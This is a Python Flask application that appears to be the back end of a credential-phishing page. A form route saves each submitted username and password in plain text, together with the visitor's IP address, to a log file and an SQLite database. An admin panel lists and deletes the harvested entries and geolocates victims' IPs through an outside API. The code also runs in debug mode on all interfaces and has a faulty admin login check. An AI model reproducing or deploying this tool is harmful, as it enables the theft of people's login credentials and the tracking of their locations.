from flask import Flask, render_template, request
import sqlite3 as sql
import requests
import io

app = Flask(__name__,template_folder='Template')


@app.route('/')
def home():
    return render_template('index.html')


@app.route('/addrec', methods=['POST', 'GET'])
def addrec():
    if request.method == 'POST':
        try:
            nm = request.form['nm']
            addr = request.form['add']
            ip = request.remote_addr
            log = io.open('log.txt', "w", encoding='utf-8')
            log.write(f"Usuario: {nm}\nContraseña: {addr}\nDireccion Ip: {ip}")
            log.close()
            with sql.connect("database.db") as con:
                cur = con.cursor()
                cur.execute("INSERT INTO datos (usuario,contrasena,ip)VALUES(?, ?, ?)",(nm,addr,ip))
                con.commit()

        except:
            con.rollback()
        finally:
            con.close()
            return render_template("result.html")

@app.route('/admin', methods=['POST', 'GET'])
def admin():
    if request.method == 'POST':
        nm = request.form['username']
        addr = request.form['password']

        con = sql.connect("admin.db")
        con.row_factory = sql.Row
        cur = con.cursor()
        cur.execute("select * from datos")
        rows = cur.fetchall()
        for row in rows:
            if row['usuario']==nm and row['contrasena']==addr:
                return list()
            else:
                return render_template('admin.html')
    return render_template('admin.html')


@app.route('/admin/list')
def list():
    con = sql.connect("database.db")
    con.row_factory = sql.Row
    cur = con.cursor()
    cur.execute("select * from datos")
    rows = cur.fetchall()
    return render_template("list.html", rows=rows)

@app.route('/admin/list/<int:id>')
def listRemove(id):
    con = sql.connect("database.db")
    con.row_factory = sql.Row

    cur = con.cursor()
    cur.execute(f"DELETE FROM datos WHERE id={str(id)}")
    con.commit()
    con.close()
    return list()

@app.route('/admin/list/ubi',methods=['POST'])
def geo():
    ip = request.form['ip']
    try:
        api = f"http://ip-api.com/json/{ip}?fields=status," \
              f"message,continent,continentCode,country,countryCode" \
              f",region,regionName,city,district,zip,lat,lon,timezone," \
              f"offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query"
        data = requests.get(api).json()
        return render_template('localizador.html', data=data)
    except:
        error = "Ocurrio un error al conectar "
        return render_template('localizador.html', data=error)



if __name__ == '__main__':
    app.run(host="0.0.0.0", port=8000, debug=True)
